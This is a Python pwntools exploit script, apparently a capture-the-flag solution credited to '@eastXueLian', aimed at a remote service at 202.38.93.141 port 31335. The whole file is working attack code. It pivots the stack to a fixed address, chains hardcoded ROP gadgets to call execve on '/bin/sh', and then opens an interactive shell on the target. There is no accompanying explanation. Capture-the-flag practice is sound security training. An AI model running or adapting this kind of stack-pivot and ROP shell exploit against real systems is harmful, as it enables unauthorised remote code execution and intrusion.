#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian

from pwn import *

context.log_level = "info"
context.arch = "amd64"

io = remote("202.38.93.141", 31335)

u64_ex = lambda data: u64(data.ljust(8, b"\x00"))
i2b = lambda c: str(c).encode()

io.recvuntil(b":")
io.sendline(input("Input your token: ").encode())


def send_payload(payload):
    payload_list = [0 for i in range(len(payload) // 8 + 1)]
    for i in range(0, len(payload), 8):
        payload_list[i // 8] = u64_ex((payload[i:])[:8])
    data = b""
    for i in payload_list:
        data += i2b(i)
        data += b" "
    io.send(data + i2b(0x31337) + b"\n")
    io.recvuntil(b"next round has begun.\n")


io.recvuntil(b"stop reading until I receive the correct one.")
send_payload(b"a")

try_addr = 0x0000000000401F0E
new_stack = 0x31337000
pop_rdi_ret = 0x0000000000402F7C
pop_rsi_ret = 0x0000000000404669
pop_rdx_2_ret = 0x00000000004AF0DB
pop_rax_ret = 0x0000000000463DA7
syscall_ret = 0x42EA86
payload = flat(
    {
        0x00: [0x1111, 0x2222, 0x3333, 0x4444, new_stack],
        0x28: [try_addr + 1, 0xDEADBEEF, 0xCAFECAFE, 0x31337],
    }
)
send_payload(payload)

payload = flat(
    {
        0x00: [u64_ex(b"/bin/sh\x00"), 0x2222, 0x3333, 0x4444, new_stack + 0x10],
        0x28: [
            try_addr + 1,
            0x4DE4B0,
            pop_rdi_ret,
            0x31336FE0,
            pop_rsi_ret,
            0,
            pop_rdx_2_ret,
            0x31337010,
            0,
            pop_rax_ret,
            0x3B,
            syscall_ret,
        ],
    }
)
send_payload(payload)

io.interactive()
